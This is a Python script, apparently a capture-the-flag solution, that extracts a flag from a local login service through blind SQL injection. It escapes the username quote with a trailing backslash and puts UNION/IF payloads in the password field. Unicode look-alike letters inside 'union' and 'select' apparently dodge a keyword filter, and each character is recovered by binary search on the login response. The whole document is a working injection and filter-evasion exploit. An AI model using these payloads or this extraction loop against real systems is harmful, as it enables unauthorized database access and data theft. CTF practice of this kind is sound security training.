import requests
import json

url = "http://localhost:5001/login"

s = requests.Session()

def send(payload):
    data = {
        "username":"xyz\\",
        "password": payload
    }
    r = s.post(url, data=data, timeout=5)
    data = json.loads(r.text)
    if data.get("status") == "Login successfully":
        return True
    return False

FLAG = ''

for i in range(1,21):
    l, r = 45, 127
    while l < r:
        mid = (l+r+1)//2
        payload = f"unɑion(selɑect(1),if(ascii(substr((selɑect(flag)from(flag)),{i},1))>={mid},1,exp(~1000)),3);"
        check = send(payload)
        if check:
            l = mid
        else:
            r = mid - 1
        print(f"payload: {payload}, pos: {i}, try: {chr(mid)}", end="\r")
    FLAG += chr(l)

print("\n", f"FLAG: {FLAG}")